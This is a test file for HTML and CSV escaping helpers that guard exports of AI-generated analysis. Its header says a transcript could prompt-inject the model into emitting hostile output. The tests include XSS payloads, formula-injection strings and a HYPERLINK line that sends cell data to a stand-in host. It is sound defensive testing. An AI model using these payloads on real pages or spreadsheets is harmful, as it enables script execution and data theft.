// Tests for export escaping.
//
// Both fixes here closed a hole where AI-generated analysis text reached a
// generated file unescaped:
//
//   HTML: generateHTMLExport interpolated data.project.name and the whole
//   markdown body (summary, themes, key insights, patterns, speaker names) into
//   a text/html Blob. The file is written to disk and opened outside the app,
//   so the app's CSP does not apply — a model response containing <script>, or
//   an "</title><script>" break-out, executed when the user opened the export.
//
//   CSV: generateCSVExport wrapped values in quotes without escaping embedded
//   quotes, and did nothing about formula injection, so a theme starting with
//   "=" became a live formula in Excel/LibreOffice/Sheets.
//
// Both inputs are prompt-injectable: a transcript can steer the model into
// emitting them.

import { describe, it, expect } from 'vitest';
import { escapeHtml, csvCell } from '../src/utils/export-escape';

describe('escapeHtml', () => {
  it('escapes every character that can start markup', () => {
    expect(escapeHtml('<script>alert(1)</script>')).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;'
    );
    expect(escapeHtml(`" onload="x`)).toBe('&quot; onload=&quot;x');
    expect(escapeHtml(`it's`)).toBe('it&#39;s');
  });

  it('escapes ampersand exactly once (no double-escaping)', () => {
    expect(escapeHtml('a & b')).toBe('a &amp; b');
    expect(escapeHtml('&lt;')).toBe('&amp;lt;');
  });

  it('neutralises a </title> break-out', () => {
    const out = escapeHtml('</title><script>alert(1)</script>');
    expect(out).not.toMatch(/<\/?title/i);
    expect(out).not.toContain('<script');
  });

  it('neutralises attribute-injection payloads', () => {
    for (const payload of [
      '" onerror="alert(1)',
      "' onmouseover='alert(1)",
      '"><img src=x onerror=alert(1)>',
    ]) {
      const out = escapeHtml(payload);
      expect(out, payload).not.toContain('<');
      expect(out, payload).not.toContain('>');
    }
  });

  it('handles null, undefined and non-strings', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(false)).toBe('false');
  });

  it('leaves ordinary prose untouched', () => {
    const prose = 'The team aligned on scope (Q3) & velocity — next steps clear.';
    // Only & changes; nothing else should.
    expect(escapeHtml(prose)).toBe(
      'The team aligned on scope (Q3) &amp; velocity — next steps clear.'
    );
  });
});

describe('csvCell', () => {
  it('doubles embedded quotes so they cannot break out of the field', () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it('neutralises formula injection', () => {
    // Excel/LibreOffice/Sheets evaluate these as formulas.
    for (const payload of [
      '=1+1',
      '+1+1',
      '-1+1',
      '@SUM(A1)',
      '\t=1+1',
      '\r=1+1',
    ]) {
      const out = csvCell(payload);
      expect(out, payload).toMatch(/^"'/);
      expect(out.slice(1, 2), payload).not.toBe('=');
      expect(out, payload).not.toMatch(/^"[=+\-@]/);
    }
  });

  it('neutralises a HYPERLINK exfiltration payload', () => {
    const out = csvCell('=HYPERLINK("http://evil.test/?d="&A1,"click")');
    expect(out.startsWith('"\'')).toBe(true);
    expect(out).not.toMatch(/^"=/);
  });

  it('always wraps in quotes, even when quoting is unnecessary', () => {
    expect(csvCell('plain')).toBe('"plain"');
    expect(csvCell(7)).toBe('"7"');
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it('preserves newlines inside a quoted field', () => {
    // Legal in RFC 4180 quoted fields; without the quotes it would split rows.
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });
});